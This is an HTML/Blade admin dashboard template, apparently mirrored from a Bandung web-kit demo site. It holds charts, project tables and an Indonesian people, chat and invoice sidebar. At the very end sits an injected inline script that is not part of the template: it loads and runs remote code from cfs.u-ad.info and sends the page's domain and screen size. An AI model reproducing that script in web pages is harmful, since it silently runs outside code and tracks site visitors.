<!DOCTYPE html>
<html lang="en" class="">

<!-- Mirrored from bdgwebkit.com/dashboard-components/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:46:37 GMT -->
<!-- head -->
@include('includes.head')
<!-- head -->
<body>
  <div class="app app-header-fixed ">


    <!-- header -->
    @include('includes.header')
    <!-- header -->


    <!-- aside -->
    @include('includes.sidebar')
    <!-- / aside -->

    <!-- content -->
    @yield('content')
  </div>
</div>

<div class="row">
  <div class="col-sm-6">
    <div class="panel panel-default">
      <div class="panel-heading font-semibold">
        <span class="label bg-danger pull-right m-t-xs">12 errors</span>
        Status
      </div>
      <table class="table table-striped m-b-none">
        <thead>
          <tr>
            <th>Progress</th>
            <th>Item</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>
              <div class="progress progress-xs m-t-xs m-b-none">
                <div class="progress-bar bg-info" data-toggle="tooltip" data-original-title="40%" style="width: 40%"></div>
              </div>

            </td>
            <td>Wireframe</td>
          </tr>
          <tr>                    
            <td>
              <div class="progress progress-xs m-t-xs m-b-none">
                <div class="progress-bar bg-danger" data-toggle="tooltip" data-original-title="35%" style="width: 35%"></div>
              </div>
            </td>
            <td>Design Concept</td>
          </tr>
          <tr>                    
            <td>
              <div class="progress progress-xs m-t-xs m-b-none">
                <div class="progress-bar bg-success" data-toggle="tooltip" data-original-title="60%" style="width: 60%"></div>
              </div>
            </td>
            <td>User Interface Kit</td>
          </tr>
          <tr>                    
            <td>                
             <div class="progress progress-xs progress-striped active m-t-xs m-b-none">
              <div class="progress-bar bg-primary" data-toggle="tooltip" data-original-title="80%" style="width: 80%"></div>
            </div>
          </td>
          <td>Testing</td>
        </tr>
      </tbody>
    </table>
  </div>
</div>
<div class="col-sm-6">
  <div class="panel panel-default">
    <div class="panel-heading font-semibold">Stats</div>
    <table class="table table-striped m-b-none">
      <thead>
        <tr>
          <th style="width:60px;" class="text-center">Graph</th>
          <th>Item</th>                    
          <th style="width:70px;"></th>
        </tr>
      </thead>
      <tbody>
        <tr>                    
          <td>
            <div ui-jq="sparkline" ui-options="[ 16,15,15,14,17,18,16,15,16 ], {type:'bar', height:17, barWidth:4, barSpacing:2, barColor:'#8dc80e'}" class="sparkline inline">loading...</div>
          </td>
          <td>Wireframe</td>
          <td class="text-success">
            40%
          </td>
        </tr>
        <tr>
          <td class="text-center">
            <div  ui-jq="sparkline" ui-options="[ 40,30,30 ], {type:'pie', height:17, sliceColors:['#00b0ef','#ff7e00','#8dc80e']}" class="sparkline inline">loading...</div>
          </td>
          <td>Design Concept</td>
          <td class="text-success">
            20%
          </td>
        </tr>
        <tr>                    
          <td>
            <div ui-jq="sparkline" ui-options="[ 16,15,15,14,17,18,16,15,16 ], {type:'line', height:17, width:60, lineColor:'#ff7e00', fillColor:'#fff'}" class="sparkline inline">loading...</div>
          </td>
          <td>User Interface</td>
          <td class="text-warning">
            50%
          </td>
        </tr>
        <tr>                    
          <td>
            <div ui-jq="sparkline" ui-options="[ 16,15,15,16,15,15,14,17,14,17,18,16,15,16,14,17,18,16,15,16 ], {type:'discrete', height:17 , width:60, lineColor:'#00b0ef'}" class="sparkline inline">loading...</div>
          </td>
          <td>Testing</td>
          <td class="text-danger">
           20%
         </td>
       </tr>
     </tbody>
   </table>
 </div>
</div>
</div>

<div class="row">
  <div class="col-md-12">
    <div class="panel panel-default">
      <div class="panel-heading font-semibold">
        Responsive Table
      </div>
      <div class="row wrapper-sm">
        <div class="col-sm-5">
          <select class="input-sm form-control w-sm inline v-middle">
            <option value="0">Bulk action</option>
            <option value="1">Delete selected</option>
            <option value="2">Bulk edit</option>
            <option value="3">Export</option>
          </select>
          <button class="btn btn-sm btn-default">Apply</button>                
        </div>
        <div class="col-sm-4">
        </div>
        <div class="col-sm-3">
          <div class="input-group">
            <input type="text" class="input-sm form-control" placeholder="Search">
            <span class="input-group-btn">
              <button class="btn btn-sm btn-default" type="button">Go!</button>
            </span>
          </div>
        </div>
      </div>
      <div class="table-responsive">
        <table class="table table-striped b-t b-light">
          <thead>
            <tr>
              <th style="width:20px;">
                <label class="checkbox-inline ">
                  <input type="checkbox"><i></i>
                </label>
              </th>
              <th>Project</th>
              <th>Task</th>
              <th>Date</th>
              <th style="width:30px;"></th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Idrawfast</td>
              <td>4c</td>
              <td>Jul 25, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Formasa</td>
              <td>8c</td>
              <td>Jul 22, 2013</td>
              <td>
                <a href ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Avatar system</td>
              <td>15c</td>
              <td>Jul 15, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Throwdown</td>
              <td>4c</td>
              <td>Jul 11, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Idrawfast</td>
              <td>4c</td>
              <td>Jul 7, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Formasa</td>
              <td>8c</td>
              <td>Jul 3, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Avatar system</td>
              <td>15c</td>
              <td>Jul 2, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
            <tr>
              <td><label class="checkbox-inline "><input type="checkbox" name="post[]"><i></i></label></td>
              <td>Videodown</td>
              <td>4c</td>
              <td>Jul 1, 2013</td>
              <td>
                <a href class="active" ui-toggle-class><i class="fa fa-check text-success text-active"></i><i class="fa fa-times text-danger text"></i></a>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <footer class="panel-footer">
        <!-- footer -->
        @include('includes.footer')
      </footer>
    </div>
  </div>
</div>
<div class="row">

  <!-- Pie Chart-->
  <div class="col-md-6">
    <div class="panel panel-default">
      <div class="panel-heading font-regular">Pie</div>
      <div class="panel-body no-padder">   

        <div class="col-xs-8">
          <div class="wrapper text-center">
            <div ui-jq="sparkline" ui-options="[20,5,35,40], {type:'pie', height:140, sliceColors:['#8560a8','#ff7e00','#8dc80e','#00b0ff']}" class="sparkline inline text-center"></div>
            <div class="line pull-in"></div>
          </div>
        </div>

        <div class="col-xs-4 border-left">
         <div class="wrapper">
          <div class="text-xs">
            <ul class="sparkline-info">
              <li class="mb20 text-info font-light"><i class="fa fa-circle text-info"></i> Windows</li>
              <li class="mb20 text-success font-light"><i class="fa fa-circle text-success"></i> Linux</li>
              <li class="mb20 text-warning font-light"><i class="fa fa-circle text-warning"></i> Ubuntu</li>
              <li class="mb20 text-purple font-light"><i class="fa fa-circle text-purple"></i> OSX</li>
            </ul>                        
          </div>
        </div>

      </div>

    </div>
  </div>
</div>

<!-- Sparkline Chart -->
<div class="col-md-6">
  <div class="panel panel-default">
    <div class="panel-heading font-regular">Investment Progress</div>
    <div class="panel-body no-padder">
      <div class="row">
        <div class="col-xs-6">
          <div class="wrapper text-center">
            <div ui-jq="sparkline" ui-options="[ [2, 8], [4, 6], [6, 4], [8, 2], [10, 0], [8, 2], [6, 4], [4, 6], [2,8] ], {type:'bar', width:100, height:178, barWidth:7, barSpacing:15, stackedBarColor:['#8dc80e', '#e5e6ec']}" class="sparkline inline"></div>
          </div>

        </div>

        <div class="col-xs-6">

          <div class="wrapper">
            <p class="h3 m-b-sm">Investings</p>
            Revenue
            <div class="h3 m-b-sm font-light m-t-sm">4500,00</div>
            Costs
            <div class="h3 m-b-sm font-light m-t-sm text-success">3450,00</div>
          </div>

        </div>
      </div>
    </div>
  </div>
</div>
<!-- End Sparkline Chart -->

</div>

<div class="row">
  <div class="col-lg-6">
    <div class="panel panel-default">
      <div class="panel-heading font-regular">Double Chart</div>
      <div class="bg-dark-grey wrapper pb-zero">

        <div class="text-center m-b-n m-t-sm">
          <div ui-jq="sparkline" ui-options="[50.32,45.23,47.56,36.25,53.85,40.15,41.25,50.15,57.14,36.15,97.26,50.15,45.32,47.19,37.75,25.15,56.34,50.35,47.25,53.15], {type:'line', height:65, width: '100%', lineWidth:2, valueSpots:{'0:':'#fff'}, lineColor:'#fff', spotColor:'#fff', fillColor:'', highlightLineColor:'#fff', spotRadius:3}"></div>

          <div ui-jq="sparkline" ui-options="[ 10,9,11,10,11,10,12,10,9,10,11,9,8 ], {type:'bar', height:123, barWidth:7, barSpacing:15, barColor:'#00b0ff'}" class="sparkline inline">loading...</div>
        </div>
      </div>
      <div class="panel-body">

        <div class="wrapper20 inline full-width">
          <div class="col-xs-4">
            <p class="block font-semibold">Market</p>
            <span class="block">Rp.3.500.000</span>
          </div>
          <div class="col-xs-4">                        
           <p class="block font-semibold">Referal</p>
           <span>Rp.1.150.000</span>
         </div>
         <div class="col-xs-4">                        
          <p class="block font-semibold">Affiliate</p>
          <span>Rp.950.000</span>
        </div>
      </div>

    </div>
  </div>
</div>

<div class="col-md-6">
  <div class="panel panel-default">
    <div class="panel-heading font-regular">Double Chart Overlay</div>
    <div class="panel-body no-padder">
      <div class="wrapper">
        <div ui-jq="plot" ui-options="
        [
        { data: [ [0,7],[1,6.5],[2,12.5],[3,7],[4,9],[5,6],[6,11],[7,6.5],[8,8],[9,7] ], label: 'Unique Visits', points: { show: true, radius : 2,fill:true,fillColor : '#00b0ff' },splines: { show: true, tension: 0.45, lineWidth: 1, fill: 0.4 } }, 
        { data: [ [0,4],[1,4.5],[2,7],[3,4.5],[4,3],[5,3.5],[6,6],[7,3],[8,4],[9,3] ], label: 'Pages View', points: { show: true, radius: 2,fill:true,fillColor : '#90cb23' },splines: { show: true, tension: 0.45, lineWidth: 1, fill: 0.4 }  }
        ],
        {
        colors: [ '#01b0ff','#90cb23' ],
        series: { shadowSize: 2 },
        xaxis:{ font: { color: '#ccc' } },
        yaxis:{ font: { color: '#ccc' } },
        grid: { hoverable: true, clickable: true, borderWidth: 0, color: '#ccc' },
        legend: false,
        tooltip: true,
        tooltipOpts: { content: '%s of %x.1 is %y.4',  defaultTheme: false, shifts: { x: 0, y: 20 } }
      }
      " style="height:240px"></div>

      <div class="panel-info">
        <span class="pull-left text-info"> <i class="fa fa-circle"></i>Unique Visits</span>
        <span class="pull-left text-success"><i class="fa fa-circle"></i>Pages View</span>
      </div> 

    </div>
  </div>                  
</div>
</div>

</div>


<div class="row">
  <div class="col-md-6">
    <div class="panel panel-default">
      <div class="panel-heading font-regular">Order bar</div>
      <div class="panel-body no-padder">
       <div class="wrapper">
        <div ui-jq="plot" ui-options="
        [ 
        { label: 'A', data: [ [10, 120], [20, 100], [30, 70], [40, 90], [50, 115] ] },
        { label: 'B', data: [ [10, 80],  [20, 70], [30, 50],  [40, 75], [50, 115] ] },
        { label: 'C', data: [ [10, 30],  [20, 40], [30, 90],  [40, 80], [50, 115] ] },
        { label: 'D', data: [ [10, 10],  [20, 15], [30, 54],  [40, 50], [50, 115] ] }
        ],
        {
        bars: { show: true, fill: true, lineWidth: 0, order: 1, fillColor: { colors: [{ opacity: 0.5 }, { opacity: 0.9}] } },
        colors: ['#00e5ff', '#00b0ff', '#2979ff' ,'#3d5afe' ],
        series: { shadowSize: 1 },
        xaxis:{ font: { color: '#ccc' } },
        yaxis:{ font: { color: '#ccc' } },
        grid: { hoverable: true, clickable: true, borderWidth: 0, color: '#ccc' },                
        tooltip: true,
        legend: {show: false}
      }
      " style="height:240px"></div>

      <div class="panel-info">
        <span class="pull-left text-blue-a"> <i class="fa fa-circle"></i>Unique Visits</span>                          
        <span class="pull-left text-blue-b"><i class="fa fa-circle"></i>Pages View</span>
        <span class="pull-left text-blue-c"><i class="fa fa-circle"></i>Comments</span>
        <span class="pull-left text-blue-d"><i class="fa fa-circle"></i>Likes</span>
      </div> 

    </div>
  </div>                  
</div>
</div>
<div class="col-md-6">
  <div class="panel panel-default">
    <div class="panel-heading font-regular">Donut Chart</div>
    <div class="panel-body no-padder">
      <div class="wrapper">
        <div ui-jq="plot" ui-options="
        [ {label : 'Windows',data: [10, 80]},{label : 'OSX',data: [20, 45]},{label : 'Linux',data: [30, 50]},{label : 'Others',data: [40, 10]} ],
        {
        series: { pie: { show: true, innerRadius: 0.5, stroke: { width: 0 }, label: { show: true, threshold: 0.05 } } },
        colors: ['#00b0ff','#ff7e00','#8560a8','#8dc80e','#b8bcce'],
        grid: { hoverable: true, clickable: true, borderWidth: 0, color: '#ccc' },   
        tooltip: true,
        tooltipOpts: { content: '%s: %p.0%' },
        legend: {show: false}
      }
      " style="height:240px"></div>

      <div class="panel-info">
        <span class="pull-left text-info"> <i class="fa fa-circle"></i>Windows</span>                          
        <span class="pull-left text-warning"><i class="fa fa-circle"></i>OSX</span>
        <span class="pull-left text-purple"><i class="fa fa-circle"></i>Linux</span>
        <span class="pull-left text-success"><i class="fa fa-circle"></i>Others</span>
      </div> 
    </div>
  </div>
</div>
</div>
</div>

<div class="row">
  <div class="col-md-6">
    <div class="panel panel-default">
      <div class="panel-heading font-regular">Double Chart</div>
      <div class="panel-body no-padder">
        <div class="wrapper">
          <div ui-jq="plot" ui-options="
          [
          { data: [ [0,7],[1,6.5],[2,12.5],[3,7],[4,9],[5,6],[6,11],[7,6.5],[8,8],[9,7] ], label: ' Unique Visits', points: { show: true, radius: 3, fill:true,fillColor : '#00b0ff' }, lines: { show: true, fill: true, fillColor: { colors: [{ opacity: 0.1 }, { opacity: 0.1}] } } }, 
          { data: [ [0,4],[1,4.5],[2,7],[3,4.5],[4,3],[5,3.5],[6,6],[7,3],[8,4],[9,3] ], label: ' Pages View', points: { show: true, radius: 3,fill:true,fillColor : '#8dc80e' } }
          ],
          {
          colors: [ '#00b0ff','#8dc80e' ],
          series: { shadowSize: 2 },
          xaxis:{ font: { color: '#ccc' } },
          yaxis:{ font: { color: '#ccc' } },
          grid: { hoverable: true, clickable: true, borderWidth: 0, color: '#ccc' },
          tooltip: true,
          legend : false,
          tooltipOpts: { content: '%s of %x.1 is %y.4',  defaultTheme: false, shifts: { x: 0, y: 20 } }
        }
        " style="height:240px"></div>

        <div class="panel-info">
          <span class="pull-left text-info"> <i class="fa fa-circle"></i>Unique Visits</span>
          <span class="pull-left text-success"><i class="fa fa-circle"></i>Pages View</span>
        </div> 
      </div>              
    </div>   

  </div>
</div>

<div class="col-md-6">
  <div class="panel panel-default">
    <div class="panel-heading font-regular">Background Chart</div>
    <div class="panel-body no-padder">
      <div class="wrapper">
        <div ui-jq="plot" ui-options="
        [
        { data: [ [0,7],[1,5],[2,8],[3,10],[4,17],[5,20],[6,16],[7,10],[8,17],[9,22] ], label: 'Unique Visits', points: { show: true, radius : 2,fill:true,fillColor : '#00b0ff' },splines: { show: true, tension: 0.45, lineWidth: 1, fill: 0 } }
        ],
        {
        colors: [ '#01b0ff','#90cb23' ],
        series: { shadowSize: 2 },
        xaxis:{ font: { color: '#ccc' } },
        yaxis:{ font: { color: '#ccc' } },
        grid: { hoverable: true, clickable: true, borderWidth: 0, color: '#7b8092', backgroundColor: '#555b70' },
        legend: false,
        tooltip: true,
        tooltipOpts: { content: '%s of %x.1 is %y.4',  defaultTheme: false, shifts: { x: 0, y: 20 } }
      }
      " style="height:240px"></div>

      <div class="panel-info">
        <span class="pull-left text-info"> <h4><i class="text14 icon-bdg_arrow6"></i>9.879 <small>Users</small> </h4> </span>
        <span class="pull-left text-success"><h4><i class="text14 icon-bdg_arrow6"></i>12.879 <small>Users</small></h4> </span>                     
      </div> 

    </div>
  </div>                  
</div>
</div>

</div>

<div class="row">
  <div class="col-md-12 padder-v"></div>
</div>
</div>

</div>
<!-- App-content-body -->  

</div>
<!-- .col -->



<div class="col w-ml bg-white-only bg-auto no-border-xs">
  <div class="nav-tabs-alt" >
    <ul class="nav nav-tabs" role="tablist">
      <li class="active">
        <a data-target="#tab-1" role="tab" data-toggle="tab">
          <i class="icon-bdg_people text-md text-muted wrapper-xs"></i>People
        </a>
      </li>
      <li>
        <a data-target="#tab-2" role="tab" data-toggle="tab">
          <i class="icon-bdg_chat text-md text-muted wrapper-xs"></i>Chat
        </a>
      </li>
      <li>
        <a data-target="#tab-3" role="tab" data-toggle="tab">
          <i class="icon-bdg_invoice text-md text-muted wrapper-xs"></i>Invoice
        </a>
      </li>
    </ul>
  </div>
  <div class="tab-content">
    <div role="tabpanel" class="tab-pane active" id="tab-1">
      <div class="wrapper-none">         
        <ul class="list-group no-bg no-borders">
          <li class="list-group-item b-b padder-v">
            <a herf class="pull-left thumb-sm avatar m-r">
              <img src="img/02.jpg" alt="..." class="img-circle">
              <i class="on b-white bottom"></i>
            </a>
            <div class="clear">
              <div><a href>Mochamad Ridwan Kamil S.T., MUD.</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <a herf class="pull-left thumb-sm avatar m-r">
              <img src="img/06.jpg" alt="..." class="img-circle">
              <i class="on b-white bottom"></i>
            </a>
            <div class="clear">
              <div><a href>H.Dada Rosada S.H., M.Si.</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <a herf class="pull-left thumb-sm avatar m-r">
              <img src="img/05.jpg" alt="..." class="img-circle">
              <i class="busy b-white bottom"></i>
            </a>
            <div class="clear">
              <div><a href>H.AA Tarmana</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <a herf class="pull-left thumb-sm avatar m-r">
              <img src="img/04.jpg" alt="..." class="img-circle">
              <i class="away b-white bottom"></i>
            </a>
            <div class="clear">
              <div><a href>Wahyu Hamidjaja</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <a herf class="pull-left thumb-sm avatar m-r">
              <img src="img/03.jpg" alt="..." class="img-circle">
              <i class="away b-white bottom"></i>
            </a>
            <div class="clear">
              <div><a href>H. Ateng Wahyudi</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
        </ul>          
      </div>
    </div>
    <div role="tabpanel" class="tab-pane tab-2" id="tab-2">
      <div class="wrapper-none">

        <ul class="list-group no-bg no-border auto">
          <li class="list-group-item b-b padder-v">
            <span class="pull-left thumb-sm m-r"><img src="img/03.jpg" alt="..." class="img-circle"></span>
            <a href="#" class="text-muted" ui-toggle-class="show" target=".app-aside-right"><i class="fa fa-comment-o pull-right m-t-sm text-sm"></i></a>
            <div class="clear">
              <div><a href>H. Ateng Wahyudi</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <span class="pull-left thumb-sm m-r"><img src="img/04.jpg" alt="..." class="img-circle"></span>
            <a href="#" class="text-muted" ui-toggle-class="show" target=".app-aside-right"><i class="fa fa-comment-o pull-right m-t-sm text-sm"></i></a>
            <div class="clear">
              <div><a href>Wahyu Hamidjaja</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <span class="pull-left thumb-sm m-r"><img src="img/05.jpg" alt="..." class="img-circle"></span>
            <a href class="text-muted" ui-toggle-class="show" target=".app-aside-right"><i class="fa fa-comment-o pull-right m-t-sm text-sm"></i></a>
            <div class="clear">
              <div><a href>H.AA Tarmana</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
          <li class="list-group-item b-b padder-v">
            <span class="pull-left thumb-sm m-r"><img src="img/01.jpg" alt="..." class="img-circle"></span>
            <a href class="text-muted" ui-toggle-class="show" target=".app-aside-right"><i class="fa fa-comment-o pull-right m-t-sm text-sm"></i></a>
            <div class="clear">
              <div><a href>Mochamad Ridwan Kamil S.T., MUD.</a></div>
              <small class="text-muted">Walikota Bandung</small>
            </div>
          </li>
        </ul>
      </div>
    </div>
    <div role="tabpanel" class="tab-pane tab-3" id="tab-3">
      <div class="wrapper-none">          
        <ul class="list-group no-bg no-border auto">
          <li class="list-group-item">
            <span class="text-grey l-h-s">Dana CSR utk Kota Bandung 3:00 pm</span>
            <span class="block text12 text-info font-bold">Rp. 15.000.000,00</span>
          </li>
          <li class="list-group-item">
            <span class="text-grey l-h-s">Dana CSR utk Kota Bandung 3:00 pm</span>
            <span class="block text12 text-success font-bold">Rp. 120.451.000,00</span>
          </li>
          <li class="list-group-item">
           <span class="text-grey l-h-s">Dana CSR utk Kota Bandung 3:00 pm</span>
           <span class="block text12 text-warning font-bold">Rp. 500.000,00</span>
         </li>
         <li class="list-group-item">
          <span class="text-grey l-h-s">Dana CSR utk Kota Bandung 3:00 pm</span>
          <span class="block text12 text-danger font-bold"> - Rp. 15.000.000,00</span>
        </li>
      </ul>
    </div>
  </div>
</div>
<div class="padder-md">      
  <!-- streamline -->
  <div class="m-b text-middle text14 font-semibold">Aktifitas Terbaru</div>
  <div class="streamline b-l m-b b-grey">
    <div class="sl-item b-grey">
      <div class="m-l">
        <div class="text-muted">5 menit yang lalu</div>
        <p class="text-grey"><a href class="text-info">Wa Dedy</a> mengomentari tautan anda.</p>
      </div>
    </div>
    <div class="sl-item b-grey">
      <div class="m-l">
        <div class="text-muted">11:30</div>
        <p class="text-grey">Meeting Internal Dishub</p>
      </div>
    </div>
    <div class="sl-item b-success b-l">
      <div class="m-l">
        <div class="text-muted">10:30</div>
        <p class="text-grey">Membalas email dari <a href class="text-info">Rian</a>.</p>
      </div>
    </div>       
    <div class="sl-item b-primary b-l">
      <div class="m-l">
        <div class="text-muted">Wed, 25 Mar</div>
        <p class="text-grey"> <a href class="text-info">Syarip</a> Menyelesaikan PSD Mobile Kit.</p>
      </div>
    </div>
    <div class="sl-item b-warning b-l">
      <div class="m-l">
        <div class="text-muted">Thu, 10 Mar</div>
        <p class="text-grey"><a href class="text-info">Fajar</a> memberikan masukan Crossbrowser Testing</p>
      </div>
    </div>
    <div class="sl-item b-info b-l">
      <div class="m-l">
        <div class="text-muted">Sat, 5 Mar</div>
        <p class="text-grey">Persiapan Presentasi</p>
      </div>
    </div>
    <div class="sl-item b-grey b-l">
      <div class="m-l">
        <div class="text-muted">Sun, 11 Feb</div>
        <p class="text-grey"><a href class="text-info">Syarip</a> menyelesaikan Task <a href class="text-info">Mockup Design</a>.</p>
      </div>
    </div>
    <div class="sl-item b-grey b-l">
      <div class="m-l">
        <div class="text-muted">Thu, 17 Jan</div>
        <p class="text-grey">Follow up report HTML</p>
      </div>
    </div>
  </div>
  <!-- / streamline -->
</div>    
</div>



</div>
<!-- end hbox hbox-auto-xs -->
</div>


<!-- footer -->
<footer id="footer" class="app-footer" role="footer">
  <div class="wrapper-md padder-lg b-t bg-light">
    <span class="pull-right">&copy; Copyright Bandung <a href ui-scroll="app" class="m-l-sm text-muted"><i class="icon-bdg_arrow11"></i></a></span>
    Made with <i class="text-danger fa fa-heart"></i> in Bandung
  </div>
</footer>
<!-- / footer -->



</div>

<script src="../libs_dashboard/jquery/jquery/dist/jquery.js"></script>
<script src="../libs_dashboard/jquery/bootstrap/dist/js/bootstrap.js"></script>
<script src="js/ui-load.js"></script>
<script src="js/ui-jp.config.js"></script>
<script src="js/ui-jp.js"></script>
<script src="js/ui-nav.js"></script>
<script src="js/ui-toggle.js"></script>
<script src="js/ui-client.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnZJcdmojQFr39Gs4jOb9x5GPgVA6Zqa8FAVOupLnVmYF9nPJRCfWCt%2f1mmMju5pG0fgbjL7k6TlxDV%2fEsTUWYpAD803LEnhvpfxzL4vMyRkca0FxeLAC1bHGDHU%2bihl1npaKuSMgb5F0UdsQv0x1tebp3HhAk%2bvGjzlkhf8KWohcD76PZdSmIRAu1cabNhFzpYdQqWPVi3HWNKBajFj2M1kX6xiOrq8mp%2f4iMFEtcgYKZxuduY7z0UeazH5vnv%2fFmCQhU%2fe%2bHBKdJ3lW%2fzABuFgwRP5RDJcvRkHTZsyBJklcViBCj59o5b6TMxFDYCmcapIMolanjcDnbnKr%2fWPmv25b7U2sLWKYRRtoxtLX08xS8%2fGojQSFJhKGd%2fdjGiH48AcmNKdh%2fV9dLR2WP5ZcWU5aGGxeHuE%2btCSHepRbOcwoYukQehadPrNFkq%2fXe1PgVmjuFvI%2b2N32XqtkVS6VtGCpLZENAnHJi" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from bdgwebkit.com/dashboard-components/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:47:19 GMT -->
</html>